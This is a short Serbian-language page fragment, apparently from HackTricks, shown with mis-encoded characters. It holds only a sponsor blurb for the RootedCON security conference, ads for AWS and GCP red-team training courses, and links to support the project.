â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Å paniji** i jedna od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo okupljaliÅ¡te za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
